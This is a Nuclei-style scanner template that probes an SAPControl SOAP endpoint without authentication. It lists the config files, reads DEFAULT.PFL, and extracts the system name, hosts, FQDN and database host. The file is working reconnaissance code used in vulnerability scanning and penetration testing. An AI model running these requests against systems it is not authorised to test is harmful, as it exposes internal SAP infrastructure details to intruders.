sap-sapcontrol-readconfigfile-config-disclosure.yaml

id: sap-sapcontrol-readconfig

info:
  name: SAPControl - Read DEFAULT.PFL Config without authentication
  author: LRVT <https://github.com/l4rm4nd>
  severity: medium
  description: Retrieves and reads SAP DEFAULT.PFL configuration file that may contain sensitive information
  tags: sap,sapcontrol,soap,config,info-disclosure

http:
  - raw:
      # First request - List config files
      - |
        POST {{Path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=UTF-8
        SOAPAction: ""
        
        <?xml version="1.0" encoding="utf-8"?>
        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
          <SOAP-ENV:Header>
            <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
              <enableSession>true</enableSession>
            </sapsess:Session>
          </SOAP-ENV:Header>
          <SOAP-ENV:Body>
            <ns1:ListConfigFiles xmlns:ns1="urn:SAPControl"/>
          </SOAP-ENV:Body>
        </SOAP-ENV:Envelope>

      # Second request - Read ONLY the DEFAULT.PFL config file
      - |
        POST {{Path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=UTF-8
        SOAPAction: ""
        
        <?xml version="1.0" encoding="utf-8"?>
        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
          <SOAP-ENV:Header>
            <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
              <enableSession>true</enableSession>
            </sapsess:Session>
          </SOAP-ENV:Header>
          <SOAP-ENV:Body>
            <ns1:ReadConfigFile xmlns:ns1="urn:SAPControl">
              <filename>{{default_pfl}}</filename>
            </ns1:ReadConfigFile>
          </SOAP-ENV:Body>
        </SOAP-ENV:Envelope>

    req-condition: true

    extractors:

      # From ListConfigFiles: grab the entry that contains DEFAULT.PFL
      # Example: <item>/usr/sap/IFT/SYS/profile/DEFAULT.PFL</item>
      - type: regex
        name: default_pfl
        part: body_1
        internal: true
        group: 1
        regex:
          - '<item>([^<]*DEFAULT\.PFL[^<]*)</item>'

      # From ReadConfigFile(DEFAULT.PFL): extract interesting key = value pairs
      # based on your example response
      - type: regex
        part: body           # second response (ReadConfigFile)
        name: DEFAULT.PFL
        regex:
          - 'SAPSYSTEMNAME\s*=\s*[^\s<]+'         # SAP system name
          - 'SAPGLOBALHOST\s*=\s*[^\s<]+'        # global host
          - 'system/type\s*=\s*[^\s<]+'          # system type (e.g. J2EE)
          - 'SAPFQDN\s*=\s*[^\s<]+'              # FQDN
          - 'SAPDBHOST\s*=\s*[^\s<]+'            # DB host

    matchers-condition: and
    matchers:
      # Ensure ListConfigFiles worked and we got configfiles back
      - type: word
        part: body_1
        words:
          - "ListConfigFilesResponse"
          - "<configfiles>"
        condition: and

      # Ensure ReadConfigFile(DEFAULT.PFL) was successful
      - type: word
        part: body
        words:
          - "ReadConfigFileResponse"
          - "<lines>"
        condition: and

      - type: status
        status:
          - 200
